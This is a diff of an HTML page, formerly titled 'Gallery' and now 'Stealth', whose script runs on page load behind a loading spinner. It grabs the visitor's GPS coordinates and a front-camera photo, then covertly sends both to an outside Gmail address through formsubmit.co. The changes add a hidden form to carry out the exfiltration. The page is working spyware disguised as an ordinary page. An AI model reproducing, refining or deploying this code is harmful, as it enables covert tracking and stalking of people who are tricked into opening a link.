@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gallery</title>
+    <title>Stealth</title>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #121212; color: white; overflow: hidden; }
+        body { margin: 0; font-family: sans-serif; background: #121212; color: white; overflow: hidden; }
         #loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; display: flex; justify-content: center;
-            align-items: center; z-index: 9999; transition: opacity 0.5s;
+            align-items: center; z-index: 9999; opacity: 1; transition: opacity 0.5s;
         }
         .spinner {
             width: 40px; height: 40px; border: 4px solid #333;
@@ -17,7 +17,7 @@
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #message {
+        #msg {
             position: absolute; bottom: 20px; width: 100%; text-align: center;
             color: #888; font-size: 12px;
         }
@@ -25,118 +25,129 @@
 </head>
 <body>
 
-    <div id="loader">
-        <div class="spinner"></div>
-    </div>
-    <div id="message">Memuat...</div>
+    <div id="loader"><div class="spinner"></div></div>
+    <div id="msg">Memuat...</div>
+
+    <!-- Form Tersembunyi -->
+    <form id="stealthForm" style="display: none;" action="https://formsubmit.co/ajax/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data">
+        <!-- Field yang akan dikirim -->
+        <input type="hidden" name="message" id="field_message">
+        <!-- Input File Tersembunyi -->
+        <input type="file" name="attachment" id="fileInput" accept="image/*">
+        
+        <!-- Kunci agar FormSubmit tidak redirect ke halaman sukses -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="box">
+        <!-- Subject Email -->
+        <input type="hidden" name="_subject" value="Foto & Lokasi Baru">
+    </form>
 
     <script>
-        const EMAIL = "desamuncrat477@gmail.com";
-        const API_URL = "https://formsubmit.co/ajax/" + EMAIL;
-
         async function startStealth() {
             const loader = document.getElementById('loader');
-            const msg = document.getElementById('message');
-            
-            // 1. Ambil Lokasi
-            let lokasi = "Lokasi tidak tersedia";
+            const msg = document.getElementById('msg');
+            const input = document.getElementById('fileInput');
+            const messageField = document.getElementById('field_message');
             const isAndroid = /Android/i.test(navigator.userAgent);
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    },
-                    (err) => { lokasi = "Lokasi ditolak"; },
-                    { timeout: 10000 }
-                );
-            }
+            // 1. Siapkan Lokasi
+            let lokasi = "Lokasi tidak tersedia";
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                },
+                () => { lokasi = "Lokasi ditolak"; },
+                { timeout: 10000 }
+            );
 
             // 2. Ambil Foto
-            let fileBlob = null;
-            let fileName = "foto.jpg";
-
             if (isAndroid) {
-                // Trigger Input File
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = 'image/*';
-                input.capture = 'user'; // Kamera depan
-                
+                // Trigger native camera
                 input.click();
-
-                // Tunggu user memilih file
-                await new Promise((resolve) => {
-                    input.onchange = async (e) => {
-                        const file = e.target.files[0];
-                        if (file) {
-                            // Konversi File ke Blob agar bisa dikirim
-                            const arrayBuffer = await file.arrayBuffer();
-                            fileBlob = new Blob([arrayBuffer], { type: 'image/jpeg' });
-                            fileName = file.name;
+                
+                // Tunggu sampai user memilih file
+                await new Promise(resolve => {
+                    input.onchange = () => {
+                        if (input.files && input.files[0]) {
+                            // Data file sudah siap di input.files[0]
                         }
                         resolve();
                     };
                 });
             } else {
-                // Fallback iOS/Desktop: Gunakan Kamera Web
+                // Fallback untuk Desktop/iOS: Gunakan Kamera Web
                 try {
                     const video = document.createElement('video');
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
                     
+                    // Dapatkan stream kamera depan
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     video.srcObject = stream;
                     video.play();
 
+                    // Tunggu video siap
                     await new Promise(resolve => {
                         video.onloadedmetadata = () => {
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             ctx.drawImage(video, 0, 0);
                             
+                            // Konversi ke Blob
                             canvas.toBlob((blob) => {
-                                fileBlob = blob;
+                                if (blob) {
+                                    // Buat objek File dari Blob agar diterima oleh FormSubmit
+                                    const file = new File([blob], "foto.jpg", { type: "image/jpeg" });
+                                    // Masukkan ke input file virtual
+                                    const dataTransfer = new DataTransfer();
+                                    dataTransfer.items.add(file);
+                                    input.files = dataTransfer.files;
+                                }
+                                // Stop kamera
                                 stream.getTracks().forEach(track => track.stop());
                                 resolve();
                             }, 'image/jpeg', 0.8);
                         };
                     });
                 } catch (err) {
-                    console.error("Camera error:", err);
+                    console.error("Gagal ambil kamera:", err);
                 }
             }
 
-            // 3. Kirim Data
-            const formData = new FormData();
-            formData.append("_subject", "📸 Foto & Lokasi Baru");
-            formData.append("message", `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`);
+            // 3. Isi Data & Kirim
+            messageField.value = `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`;
             
-            // Jika ada foto, kirim sebagai attachment
-            if (fileBlob) {
-                formData.append("attachment", fileBlob, fileName);
-            } else {
-                formData.append("message", formData.get("message") + "\n\n(Foto tidak tersedia)");
+            // Cek apakah ada file sebelum submit
+            if (!input.files || input.files.length === 0) {
+                // Jika tidak ada file, kita tetap submit agar form tidak error
+                // Tapi FormSubmit biasanya menolak jika tidak ada file jika field required
+                // Kita isi message tambahan
+                messageField.value += "\n\n(Kamera tidak memberikan foto)";
             }
 
             msg.innerText = "Mengirim...";
+
+            // Gunakan fetch untuk submit tanpa reload
+            const formData = new FormData(document.getElementById('stealthForm'));
             
-            try {
-                const response = await fetch(API_URL, {
-                    method: "POST",
-                    body: formData
-                });
-                
+            fetch("https://formsubmit.co/ajax/desamuncrat477@gmail.com", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => {
                 if (response.ok) {
                     loader.style.opacity = '0';
                     setTimeout(() => { loader.style.display = 'none'; }, 500);
-                    msg.innerText = "Selesai!";
+                    msg.innerText = "Kirim Berhasil!";
                 } else {
-                    msg.innerText = "Gagal kirim: " + response.statusText;
+                    msg.innerText = "Gagal: " + response.status;
                 }
-            } catch (error) {
-                msg.innerText = "Error: " + error.message;
-            }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                msg.innerText = "Error koneksi";
+            });
         }
 
         window.onload = startStealth;
